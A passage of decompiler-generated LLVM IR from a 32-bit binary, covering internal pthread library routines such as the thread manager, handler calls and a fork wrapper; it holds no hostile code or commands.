  %v1_8056c2e = add i32 %v0_8056c2e, 134676812
  %v2_8056c2e = inttoptr i32 %v1_8056c2e to i32*
  store i32 0, i32* %v2_8056c2e, align 4
  %v0_8056c38 = load i32, i32* @global_var_8074140.629, align 64
  %v1_8056c3d = add i32 %v0_8056c38, -1
  store i32 %v1_8056c3d, i32* %eax.global-to-local, align 4
  store i32 %v1_8056c3d, i32* @global_var_8074140.629, align 64
  %v1_8056c43 = call i32 @__errno_location(i32 %arg1)
  store i32 %v1_8056c43, i32* %eax.global-to-local, align 4
  %v1_8056c48 = inttoptr i32 %v1_8056c43 to i32*
  %v2_8056c48 = load i32, i32* %v1_8056c48, align 4
  store i32 %v2_8056c48, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056c63

dec_label_pc_8056c4c:                             ; preds = %dec_label_pc_80569cf, %dec_label_pc_80568c6
  store i32 11, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056c63

dec_label_pc_8056c53:                             ; preds = %dec_label_pc_8056bc6
  %v2_8056c53 = add i32 %v1_8056c53, 20
  %v3_8056c53 = inttoptr i32 %v2_8056c53 to i32*
  store i32 %v0_8056c53, i32* %v3_8056c53, align 4
  %v0_8056c56 = load i32, i32* @esp, align 4
  %v1_8056c56 = add i32 %v0_8056c56, 4
  %v2_8056c56 = inttoptr i32 %v1_8056c56 to i32*
  %v3_8056c56 = load i32, i32* %v2_8056c56, align 4
  store i32 %v3_8056c56, i32* %eax.global-to-local, align 4
  %v1_8056c5a = add i32 %v0_8056c56, 16
  %v2_8056c5a = inttoptr i32 %v1_8056c5a to i32*
  %v3_8056c5a = load i32, i32* %v2_8056c5a, align 4
  %v2_8056c5e = add i32 %v3_8056c56, 48
  %v3_8056c5e = inttoptr i32 %v2_8056c5e to i32*
  store i32 %v3_8056c5a, i32* %v3_8056c5e, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056c63

dec_label_pc_8056c63:                             ; preds = %dec_label_pc_80568b4, %dec_label_pc_8056c4c, %dec_label_pc_8056c1d, %dec_label_pc_8056c53
  %v0_8056c67 = phi i32 [ 1, %dec_label_pc_80568b4 ], [ 11, %dec_label_pc_8056c4c ], [ %v2_8056c48, %dec_label_pc_8056c1d ], [ 0, %dec_label_pc_8056c53 ]
  %v0_8056c63 = load i32, i32* @esp, align 4
  %v1_8056c63 = add i32 %v0_8056c63, 4
  %v2_8056c63 = inttoptr i32 %v1_8056c63 to i32*
  %v3_8056c63 = load i32, i32* %v2_8056c63, align 4
  store i32 %v3_8056c63, i32* %ecx.global-to-local, align 4
  %v2_8056c67 = add i32 %v3_8056c63, 52
  %v3_8056c67 = inttoptr i32 %v2_8056c67 to i32*
  store i32 %v0_8056c67, i32* %v3_8056c67, align 4
  %v0_8056c6a = load i32, i32* @esp, align 4
  %v1_8056c6a = add i32 %v0_8056c6a, 48
  %v2_8056c6a = inttoptr i32 %v1_8056c6a to i32*
  %storemerge.pre = load i32, i32* %v2_8056c6a, align 4
  br label %dec_label_pc_8056d4b

dec_label_pc_8056c73:                             ; preds = %dec_label_pc_805684a
  %v1_8056c73 = add i32 %v0_8056861, 72
  %v2_8056c73 = inttoptr i32 %v1_8056c73 to i32*
  %v3_8056c73 = load i32, i32* %v2_8056c73, align 4
  store i32 %v3_8056c73, i32* @edi, align 4
  store i32 0, i32* @edx, align 4
  %v1_8056c7b = urem i32 %v3_8056c73, 1024
  %v2_8056c80 = mul nuw nsw i32 %v1_8056c7b, 16
  %v1_8056c83 = add nuw nsw i32 %v2_8056c80, 134676800
  store i32 %v1_8056c83, i32* @esi, align 4
  store i32 %v1_8056c83, i32* @eax, align 4
  %v1_8056c8b = call i32 @__pthread_lock(i32 %arg1)
  store i32 %v1_8056c8b, i32* %eax.global-to-local, align 4
  %v0_8056c90 = load i32, i32* @esi, align 4
  %v1_8056c90 = add i32 %v0_8056c90, 8
  %v2_8056c90 = inttoptr i32 %v1_8056c90 to i32*
  %v3_8056c90 = load i32, i32* %v2_8056c90, align 4
  store i32 %v3_8056c90, i32* @ebx, align 4
  %v1_8056c93 = icmp eq i32 %v3_8056c90, 0
  br i1 %v1_8056c93, label %dec_label_pc_8056cbb, label %dec_label_pc_8056c97

dec_label_pc_8056c97:                             ; preds = %dec_label_pc_8056c73
  %v1_8056c97 = add i32 %v3_8056c90, 16
  %v2_8056c97 = inttoptr i32 %v1_8056c97 to i32*
  %v3_8056c97 = load i32, i32* %v2_8056c97, align 4
  %v4_8056c97 = load i32, i32* @edi, align 4
  %v15_8056c97 = icmp eq i32 %v3_8056c97, %v4_8056c97
  %v1_8056c9a = icmp eq i1 %v15_8056c97, false
  br i1 %v1_8056c9a, label %dec_label_pc_8056cbb, label %dec_label_pc_8056c9c

dec_label_pc_8056c9c:                             ; preds = %dec_label_pc_8056c97
  %v1_8056c9c = add i32 %v3_8056c90, 46
  %v2_8056c9c = inttoptr i32 %v1_8056c9c to i8*
  %v3_8056c9c = load i8, i8* %v2_8056c9c, align 1
  %v4_8056c9c = icmp eq i8 %v3_8056c9c, 0
  br i1 %v4_8056c9c, label %dec_label_pc_8056cb7, label %dec_label_pc_8056ca2

dec_label_pc_8056ca2:                             ; preds = %dec_label_pc_8056c9c
  %v0_8056ca2 = load i32, i32* @esp, align 4
  %v2_8056ca5 = add i32 %v0_8056ca2, -16
  %v3_8056ca5 = inttoptr i32 %v2_8056ca5 to i32*
  store i32 %v0_8056c90, i32* %v3_8056ca5, align 4
  %v2_8056ca6 = call i32 @__pthread_unlock(i32* %v1_8056cbf)
  %v0_8056cab = load i32, i32* @ebx, align 4
  store i32 %v0_8056cab, i32* @eax, align 4
  %v0_8056cad = call i32 @pthread_free()
  store i32 %v0_8056cad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056d86

dec_label_pc_8056cb7:                             ; preds = %dec_label_pc_8056c9c
  %v1_8056cb7 = add i32 %v3_8056c90, 45
  %v2_8056cb7 = inttoptr i32 %v1_8056cb7 to i8*
  store i8 1, i8* %v2_8056cb7, align 1
  %v0_8056cbe.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056cbb

dec_label_pc_8056cbb:                             ; preds = %dec_label_pc_8056c97, %dec_label_pc_8056c73, %dec_label_pc_8056cb7
  %v0_8056cbe = phi i32 [ %v0_8056c90, %dec_label_pc_8056c97 ], [ %v0_8056c90, %dec_label_pc_8056c73 ], [ %v0_8056cbe.pre, %dec_label_pc_8056cb7 ]
  %v0_8056cbb = load i32, i32* @esp, align 4
  %v2_8056cbe = add i32 %v0_8056cbb, -16
  %v3_8056cbe = inttoptr i32 %v2_8056cbe to i32*
  store i32 %v0_8056cbe, i32* %v3_8056cbe, align 4
  %v2_8056cbf = call i32 @__pthread_unlock(i32* %v1_8056cbf)
  store i32 %v2_8056cbf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056d86

dec_label_pc_8056cc9:                             ; preds = %dec_label_pc_805684a
  %v1_8056cc9 = add i32 %v0_8056861, 64
  %v2_8056cc9 = inttoptr i32 %v1_8056cc9 to i32*
  %v3_8056cc9 = load i32, i32* %v2_8056cc9, align 4
  store i32 %v3_8056cc9, i32* @ebx, align 4
  %v1_8056ccd = add i32 %v0_8056861, 72
  %v2_8056ccd = inttoptr i32 %v1_8056ccd to i32*
  %v3_8056ccd = load i32, i32* %v2_8056ccd, align 4
  store i32 %v3_8056ccd, i32* %eax.global-to-local, align 4
  store i32 1, i32* @global_var_8078e78.640, align 8
  store i32 %v3_8056ccd, i32* @global_var_8078e7c.641, align 4
  %v1_8056ce0 = inttoptr i32 %v3_8056cc9 to i32*
  %v2_8056ce0 = load i32, i32* %v1_8056ce0, align 4
  store i32 %v2_8056ce0, i32* @esi, align 4
  %v12_8056cf976 = icmp eq i32 %v2_8056ce0, %v3_8056cc9
  %v1_8056cfb77 = icmp eq i1 %v12_8056cf976, false
  br i1 %v1_8056cfb77, label %dec_label_pc_8056ce4, label %dec_label_pc_8056cfd

dec_label_pc_8056ce4:                             ; preds = %dec_label_pc_8056cc9, %dec_label_pc_8056ce4
  %v1_8056ce478 = phi i32 [ %v1_8056cf6, %dec_label_pc_8056ce4 ], [ %v1_8056861, %dec_label_pc_8056cc9 ]
  %v0_8056ce4 = load i32, i32* @ebp, align 4
  %v2_8056ce4 = add i32 %v1_8056ce478, -4
  %v3_8056ce4 = inttoptr i32 %v2_8056ce4 to i32*
  store i32 %v0_8056ce4, i32* %v3_8056ce4, align 4
  %v0_8056ce5 = load i32, i32* @ebp, align 4
  %v2_8056ce5 = add i32 %v1_8056ce478, -8
  %v3_8056ce5 = inttoptr i32 %v2_8056ce5 to i32*
  store i32 %v0_8056ce5, i32* %v3_8056ce5, align 4
  %v0_8056ce6 = load i32, i32* @global_var_807452c.636, align 4
  %v2_8056ce6 = add i32 %v1_8056ce478, -12
  %v3_8056ce6 = inttoptr i32 %v2_8056ce6 to i32*
  store i32 %v0_8056ce6, i32* %v3_8056ce6, align 4
  %v0_8056cec = load i32, i32* @esi, align 4
  %v1_8056cec = add i32 %v0_8056cec, 20
  %v2_8056cec = inttoptr i32 %v1_8056cec to i32*
  %v3_8056cec = load i32, i32* %v2_8056cec, align 4
  %v5_8056cec = add i32 %v1_8056ce478, -16
  %v6_8056cec = inttoptr i32 %v5_8056cec to i32*
  store i32 %v3_8056cec, i32* %v6_8056cec, align 4
  %v3_8056cef = call i32 @kill(i32 %arg1, i32 1)
  store i32 %v3_8056cef, i32* %eax.global-to-local, align 4
  %v0_8056cf4 = load i32, i32* @esi, align 4
  %v1_8056cf4 = inttoptr i32 %v0_8056cf4 to i32*
  %v2_8056cf4 = load i32, i32* %v1_8056cf4, align 4
  store i32 %v2_8056cf4, i32* @esi, align 4
  %v0_8056cf6 = load i32, i32* @esp, align 4
  %v1_8056cf6 = add i32 %v0_8056cf6, 16
  %v1_8056cf9.pre = load i32, i32* @ebx, align 4
  %v12_8056cf9 = icmp eq i32 %v2_8056cf4, %v1_8056cf9.pre
  %v1_8056cfb = icmp eq i1 %v12_8056cf9, false
  br i1 %v1_8056cfb, label %dec_label_pc_8056ce4, label %dec_label_pc_8056cfd

dec_label_pc_8056cfd:                             ; preds = %dec_label_pc_8056ce4, %dec_label_pc_8056cc9
  %v1_8056ce4.lcssa = phi i32 [ %v1_8056861, %dec_label_pc_8056cc9 ], [ %v1_8056cf6, %dec_label_pc_8056ce4 ]
  %v0_8056cfd.lcssa = phi i32 [ %v2_8056ce0, %dec_label_pc_8056cc9 ], [ %v2_8056cf4, %dec_label_pc_8056ce4 ]
  %v1_8056cfd = inttoptr i32 %v0_8056cfd.lcssa to i32*
  %v2_8056cfd = load i32, i32* %v1_8056cfd, align 4
  store i32 %v2_8056cfd, i32* @ebx, align 4
  %v12_8056d1667 = icmp eq i32 %v2_8056cfd, %v0_8056cfd.lcssa
  %v1_8056d1868 = icmp eq i1 %v12_8056d1667, false
  br i1 %v1_8056d1868, label %dec_label_pc_8056d01, label %dec_label_pc_8056d1a

dec_label_pc_8056d01:                             ; preds = %dec_label_pc_8056cfd, %dec_label_pc_8056d01
  %v1_8056d0169 = phi i32 [ %v1_8056d13, %dec_label_pc_8056d01 ], [ %v1_8056ce4.lcssa, %dec_label_pc_8056cfd ]
  %v0_8056d01 = load i32, i32* @edi, align 4
  %v2_8056d01 = add i32 %v1_8056d0169, -4
  %v3_8056d01 = inttoptr i32 %v2_8056d01 to i32*
  store i32 %v0_8056d01, i32* %v3_8056d01, align 4
  %v1_8056d02 = add i32 %v1_8056d0169, -8
  %v2_8056d02 = inttoptr i32 %v1_8056d02 to i32*
  store i32 -2147483648, i32* %v2_8056d02, align 4
  %v1_8056d07 = add i32 %v1_8056d0169, -12
  %v2_8056d07 = inttoptr i32 %v1_8056d07 to i32*
  store i32 0, i32* %v2_8056d07, align 4
  %v0_8056d09 = load i32, i32* @ebx, align 4
  %v1_8056d09 = add i32 %v0_8056d09, 20
  %v2_8056d09 = inttoptr i32 %v1_8056d09 to i32*
  %v3_8056d09 = load i32, i32* %v2_8056d09, align 4
  %v5_8056d09 = add i32 %v1_8056d0169, -16
  %v6_8056d09 = inttoptr i32 %v5_8056d09 to i32*
  store i32 %v3_8056d09, i32* %v6_8056d09, align 4
  %v2_8056d0c = load i32, i32* %stack_var_-16, align 4
  %v5_8056d0c = call i32 @waitpid(i32 %arg1, i32 1, i32 %v2_8056d0c, i32 %v0_805672f)
  store i32 %v5_8056d0c, i32* %eax.global-to-local, align 4
  %v0_8056d11 = load i32, i32* @ebx, align 4
  %v1_8056d11 = inttoptr i32 %v0_8056d11 to i32*
  %v2_8056d11 = load i32, i32* %v1_8056d11, align 4
  store i32 %v2_8056d11, i32* @ebx, align 4
  %v0_8056d13 = load i32, i32* @esp, align 4
  %v1_8056d13 = add i32 %v0_8056d13, 16
  %v1_8056d16.pre = load i32, i32* @esi, align 4
  %v12_8056d16 = icmp eq i32 %v2_8056d11, %v1_8056d16.pre
  %v1_8056d18 = icmp eq i1 %v12_8056d16, false
  br i1 %v1_8056d18, label %dec_label_pc_8056d01, label %dec_label_pc_8056d1a

dec_label_pc_8056d1a:                             ; preds = %dec_label_pc_8056d01, %dec_label_pc_8056cfd
  %v0_8056d1a.lcssa = phi i32 [ %v2_8056cfd, %dec_label_pc_8056cfd ], [ %v2_8056d11, %dec_label_pc_8056d01 ]
  store i32 %v0_8056d1a.lcssa, i32* @eax, align 4
  %v0_8056d1c = call i32 @restart()
  br label %dec_label_pc_8056d21

dec_label_pc_8056d21:                             ; preds = %dec_label_pc_8056817, %dec_label_pc_8056d1a
  %storemerge1 = phi i32 [ %v0_8056d1c, %dec_label_pc_8056d1a ], [ %v0_805681b, %dec_label_pc_8056817 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  %v0_8056d21 = load i32, i32* @esp, align 4
  %v1_8056d24 = add i32 %v0_8056d21, -16
  %v2_8056d24 = inttoptr i32 %v1_8056d24 to i32*
  store i32 0, i32* %v2_8056d24, align 4
  %v1_8056d26 = call i32 @__GI__exit(i32 %arg1)
  unreachable

dec_label_pc_8056d2b:                             ; preds = %dec_label_pc_805684a
  store i32 1, i32* @global_var_8078d24.623, align 4
  %v0_8056d35 = call i32 @pthread_reap_children()
  %v0_8056d3a = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  store i32 %v0_8056d3a, i32* %eax.global-to-local, align 4
  store i32 %v0_8056d3a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056d4b

dec_label_pc_8056d4b:                             ; preds = %dec_label_pc_8056c63, %dec_label_pc_8056d2b
  %storemerge = phi i32 [ %v0_8056d3a, %dec_label_pc_8056d2b ], [ %storemerge.pre, %dec_label_pc_8056c63 ]
  store i32 %storemerge, i32* @eax, align 4
  %v0_8056d4b = call i32 @restart()
  store i32 %v0_8056d4b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80567f3thread-pre-split

dec_label_pc_8056d55:                             ; preds = %dec_label_pc_805684a
  %v1_8056d58 = add i32 %v0_8056861, 72
  %v2_8056d58 = inttoptr i32 %v1_8056d58 to i32*
  %v3_8056d58 = load i32, i32* %v2_8056d58, align 4
  %v6_8056d58 = inttoptr i32 %v0_8056861 to i32*
  store i32 %v3_8056d58, i32* %v6_8056d58, align 4
  %v0_8056d5c = call i32 @__new_sem_post()
  store i32 %v0_8056d5c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056d86

dec_label_pc_8056d86:                             ; preds = %dec_label_pc_8056d55, %dec_label_pc_8056cbb, %dec_label_pc_8056ca2
  %v0_8056d86 = load i32, i32* @esp, align 4
  %v1_8056d86 = add i32 %v0_8056d86, 16
  br label %dec_label_pc_80567f3

; uselistorder directives
  uselistorder i32 %v2_8056d11, { 1, 0, 2 }
  uselistorder i32 %v2_8056cfd, { 1, 0, 2 }
  uselistorder i32 %v2_8056cf4, { 1, 0, 2 }
  uselistorder i32 %v2_8056ce0, { 1, 0, 2 }
  uselistorder i32 %v2_8056c21, { 1, 0 }
  uselistorder i32 %v1_8056c53, { 2, 1, 0 }
  uselistorder i32 %v0_8056c53, { 1, 0 }
  uselistorder i32 %v12_8056bb2, { 1, 0 }
  uselistorder i32 %v0_8056b7c, { 1, 0 }
  uselistorder i32 %v5_8056b6d, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8056a98, { 1, 0 }
  uselistorder i32 %v1_80569d8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_80568ce, { 1, 0 }
  uselistorder i32 %v0_80568ce, { 1, 0 }
  uselistorder i32 %v1_8056981, { 1, 0 }
  uselistorder i32 %v2_8056961, { 1, 0 }
  uselistorder i32 %v1_8056953, { 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32 %tmp49, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8056932, { 1, 0, 2 }
  uselistorder i32 %v2_80568e0, { 1, 0 }
  uselistorder i32 %v0_80568ce90, { 2, 0, 1 }
  uselistorder i32 %v0_805688c, { 1, 0, 2 }
  uselistorder i32 %v1_8056861, { 1, 2, 0 }
  uselistorder i32 %v0_8056861, { 7, 6, 3, 4, 5, 0, 1, 2, 8, 9 }
  uselistorder i32 %v0_8056840, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_805683d, { 1, 0 }
  uselistorder i32 %v1_80567f3, { 5, 4, 3, 2, 1, 0 }
  uselistorder i16* %v4_8056b06, { 1, 0 }
  uselistorder i32* %v1_8056cbf, { 2, 1, 0 }
  uselistorder i32 %v2_805674b, { 3, 2, 1, 5, 4, 0, 7, 6, 9, 8, 10 }
  uselistorder i32 %v0_805672f, { 0, 5, 6, 2, 1, 7, 3, 4 }
  uselistorder i32* %stack_var_-16, { 12, 7, 6, 10, 11, 2, 3, 1, 0, 9, 8, 4, 5, 13 }
  uselistorder i32* %edx.global-to-local, { 19, 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20 }
  uselistorder i32* %eax.global-to-local, { 0, 70, 71, 91, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 92, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 73, 68, 69, 93, 94, 95, 72, 74, 76, 75, 77, 78, 79, 81, 80, 82, 83, 85, 84, 86, 87, 88, 89, 90 }
  uselistorder i32 ()* @restart, { 1, 2, 0 }
  uselistorder i32 ()* @pthread_free, { 1, 0 }
  uselistorder i32 ()* @pthread_reap_children, { 1, 0 }
  uselistorder i32* @global_var_8078d20.622, { 1, 2, 3, 0, 4 }
  uselistorder i32 %arg1, { 16, 17, 18, 15, 6, 7, 5, 8, 3, 4, 9, 1, 2, 0, 12, 13, 19, 20, 10, 11, 14, 21, 24, 23, 22 }
  uselistorder label %dec_label_pc_8056d4b, { 1, 0 }
  uselistorder label %dec_label_pc_8056d21, { 1, 0 }
  uselistorder label %dec_label_pc_8056d01, { 1, 0 }
  uselistorder label %dec_label_pc_8056ce4, { 1, 0 }
  uselistorder label %dec_label_pc_8056cbb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056c63, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056c1d, { 1, 0 }
  uselistorder label %dec_label_pc_8056c01, { 1, 0 }
  uselistorder label %dec_label_pc_8056bc6, { 1, 0 }
  uselistorder label %dec_label_pc_8056ba8, { 1, 0 }
  uselistorder label %dec_label_pc_8056ae9, { 1, 0 }
  uselistorder label %dec_label_pc_8056ae0, { 1, 0 }
  uselistorder label %dec_label_pc_8056add, { 1, 0 }
  uselistorder label %dec_label_pc_80569d8, { 1, 0 }
  uselistorder label %dec_label_pc_805694b, { 1, 0 }
  uselistorder label %dec_label_pc_8056947, { 1, 0 }
  uselistorder label %dec_label_pc_80568dc, { 1, 0 }
  uselistorder label %dec_label_pc_805683d, { 1, 0 }
  uselistorder label %dec_label_pc_80567f3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80567f3thread-pre-split, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8056791, { 2, 0, 1 }
}

define i32 @__pthread_manager_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @edx, align 4
  %v0_8056d93 = load i32, i32* bitcast (i32** @global_var_807435c.643 to i32*), align 4
  store i32 %v0_8056d93, i32* @eax, align 4
  %v1_8056d98 = call i32 @__pthread_lock(i32 ptrtoint (i32* @0 to i32))
  %v0_8056da0 = load i32, i32* bitcast (i32** @global_var_807435c.643 to i32*), align 4
  %v1_8056da6 = inttoptr i32 %v0_8056da0 to i32*
  %v2_8056da6 = call i32 @__pthread_unlock(i32* %v1_8056da6)
  %v1_8056db0 = call i32 @__pthread_manager(i32 %arg1)
  ret i32 %v1_8056db0
}

define i32 @pthread_insert_list(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8056db8 = load i32, i32* @ebx, align 4
  store i32 %v0_8056db8, i32* %stack_var_-4, align 4
  %v0_8056db9 = load i32, i32* @edx, align 4
  %v1_8056db9 = icmp eq i32 %v0_8056db9, 0
  %v0_8056dbb = load i32, i32* @eax, align 4
  store i32 %v0_8056dbb, i32* %ebx.global-to-local, align 4
  br i1 %v1_8056db9, label %dec_label_pc_8056dda, label %dec_label_pc_8056dbf

dec_label_pc_8056dbf:                             ; preds = %entry
  %v4_8056dbf = icmp eq i32 %arg1, 0
  %v1_8056dc4 = icmp eq i1 %v4_8056dbf, false
  br i1 %v1_8056dc4, label %dec_label_pc_8056dcb.preheader, label %dec_label_pc_8056dd1

dec_label_pc_8056dcb.preheader:                   ; preds = %dec_label_pc_8056dbf
  %v1_8056dcb2 = inttoptr i32 %v0_8056dbb to i32*
  %v2_8056dcb3 = load i32, i32* %v1_8056dcb2, align 4
  %v1_8056dcd4 = icmp eq i32 %v2_8056dcb3, 0
  %v1_8056dcf11 = icmp eq i1 %v1_8056dcd4, false
  br i1 %v1_8056dcf11, label %dec_label_pc_8056dc8, label %dec_label_pc_8056dd1

dec_label_pc_8056dc8:                             ; preds = %dec_label_pc_8056dcb.preheader, %dec_label_pc_8056dc8
  %v2_8056dcb12 = phi i32 [ %v2_8056dcb, %dec_label_pc_8056dc8 ], [ %v2_8056dcb3, %dec_label_pc_8056dcb.preheader ]
  %v1_8056dc8 = add i32 %v2_8056dcb12, 4
  store i32 %v1_8056dc8, i32* %ebx.global-to-local, align 4
  %v1_8056dcb = inttoptr i32 %v1_8056dc8 to i32*
  %v2_8056dcb = load i32, i32* %v1_8056dcb, align 4
  %v1_8056dcd = icmp eq i32 %v2_8056dcb, 0
  %v1_8056dcf = icmp eq i1 %v1_8056dcd, false
  br i1 %v1_8056dcf, label %dec_label_pc_8056dc8, label %dec_label_pc_8056dcb.dec_label_pc_8056dd1.loopexit_crit_edge

dec_label_pc_8056dcb.dec_label_pc_8056dd1.loopexit_crit_edge: ; preds = %dec_label_pc_8056dc8
  br label %dec_label_pc_8056dd1

dec_label_pc_8056dd1:                             ; preds = %dec_label_pc_8056dcb.preheader, %dec_label_pc_8056dcb.dec_label_pc_8056dd1.loopexit_crit_edge, %dec_label_pc_8056dbf
  %v1_8056dd1 = load i32, i32* @ecx, align 4
  %v2_8056dd1 = inttoptr i32 %v1_8056dd1 to i32*
  store i32 %v0_8056db9, i32* %v2_8056dd1, align 4
  %v0_8056dd3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056dd3 = inttoptr i32 %v0_8056dd3 to i32*
  %v2_8056dd3 = load i32, i32* %v1_8056dd3, align 4
  %v1_8056dd5 = load i32, i32* @ecx, align 4
  %v2_8056dd5 = add i32 %v1_8056dd5, 4
  %v3_8056dd5 = inttoptr i32 %v2_8056dd5 to i32*
  store i32 %v2_8056dd3, i32* %v3_8056dd5, align 4
  %v0_8056dd8 = load i32, i32* @ecx, align 4
  %v1_8056dd8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056dd8 = inttoptr i32 %v1_8056dd8 to i32*
  store i32 %v0_8056dd8, i32* %v2_8056dd8, align 4
  %v2_8056dda.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8056dda

dec_label_pc_8056dda:                             ; preds = %entry, %dec_label_pc_8056dd1
  %v2_8056dda = phi i32 [ %v0_8056db8, %entry ], [ %v2_8056dda.pre, %dec_label_pc_8056dd1 ]
  %.0 = phi i32 [ undef, %entry ], [ %v2_8056dd3, %dec_label_pc_8056dd1 ]
  store i32 %v2_8056dda, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_8056dcb, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8056dda, { 1, 0 }
  uselistorder label %dec_label_pc_8056dd1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056dc8, { 1, 0 }
}

define i32 @pthread_call_handlers() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp16, i32* %stack_var_-12, align 4
  %v0_8056ddd = load i32, i32* @eax, align 4
  store i32 %v0_8056ddd, i32* %ebx.global-to-local, align 4
  %v1_8056de92 = icmp eq i32 %v0_8056ddd, 0
  %v1_8056deb9 = icmp eq i1 %v1_8056de92, false
  br i1 %v1_8056deb9, label %dec_label_pc_8056de4.lr.ph, label %dec_label_pc_8056ded

dec_label_pc_8056de4.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8056de4

dec_label_pc_8056de4:                             ; preds = %dec_label_pc_8056de4.lr.ph, %dec_label_pc_8056de4
  %v4_8056de4 = phi i32 [ %v0_8056ddd, %dec_label_pc_8056de4.lr.ph ], [ %v3_8056de6, %dec_label_pc_8056de4 ]
  %v5_8056de4 = inttoptr i32 %v4_8056de4 to i32*
  %v6_8056de4 = load i32, i32* %v5_8056de4, align 4
  call void @__pseudo_call(i32 %v6_8056de4)
  %v0_8056de6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056de6 = add i32 %v0_8056de6, 4
  %v2_8056de6 = inttoptr i32 %v1_8056de6 to i32*
  %v3_8056de6 = load i32, i32* %v2_8056de6, align 4
  store i32 %v3_8056de6, i32* %ebx.global-to-local, align 4
  %v1_8056de9 = icmp eq i32 %v3_8056de6, 0
  %v1_8056deb = icmp eq i1 %v1_8056de9, false
  br i1 %v1_8056deb, label %dec_label_pc_8056de4, label %dec_label_pc_8056de9.dec_label_pc_8056ded_crit_edge

dec_label_pc_8056de9.dec_label_pc_8056ded_crit_edge: ; preds = %dec_label_pc_8056de4
  %v2_8056ded.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8056ded

dec_label_pc_8056ded:                             ; preds = %dec_label_pc_8056de9.dec_label_pc_8056ded_crit_edge, %entry
  %v2_8056ded = phi i32 [ %v2_8056ded.pre, %dec_label_pc_8056de9.dec_label_pc_8056ded_crit_edge ], [ %tmp16, %entry ]
  ret i32 %v2_8056ded

; uselistorder directives
  uselistorder i32 %v3_8056de6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8056de4, { 1, 0 }
}

define i32 @fork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8056df1 = load i32, i32* @ebp, align 4
  %v0_8056df2 = load i32, i32* @edi, align 4
  %v0_8056df3 = load i32, i32* @esi, align 4
  %v0_8056df4 = load i32, i32* @ebx, align 4
  store i32 %v0_8056df4, i32* %stack_var_-16, align 4
  %v1_8056dfd = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8078d2c.644 to i32))
  %v0_8056e02 = load i32, i32* @global_var_8078d44.645, align 4
  store i32 %v0_8056e02, i32* @eax, align 4
  %v0_8056e07 = load i32, i32* @global_var_8078d48.646, align 8
  store i32 %v0_8056e07, i32* @ebp, align 4
  %v0_8056e0d = load i32, i32* @global_var_8078d4c.647, align 4
  store i32 %v0_8056e0d, i32* @ebx, align 4
  %v0_8056e13 = call i32 @pthread_call_handlers()
  %v0_8056e18 = call i32 @__pthread_once_fork_prepare()
  %v1_8056e24 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074750.648 to i32))
  %v0_8056e29 = call i32 @__libc_fork()
  store i32 %v0_8056e29, i32* @edi, align 4
  %v1_8056e33 = icmp eq i32 %v0_8056e29, 0
  %v1_8056e35 = icmp eq i1 %v1_8056e33, false
  br i1 %v1_8056e35, label %dec_label_pc_8056eb6, label %dec_label_pc_8056e37

dec_label_pc_8056e37:                             ; preds = %entry
  %v2_8056e43 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056e43, i32* @ebx, align 4
  %v2_8056e48 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_8056e52 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 1)
  %v3_8056e5f = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8074750.648 to i32), i32* nonnull %stack_var_-20)
  %v1_8056e67 = call i32 @pthread_mutexattr_destroy(i32 %v2_8056e43)
  %v2_8056e77 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_8056e81 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 0)
  store i32 0, i32* @esi, align 4
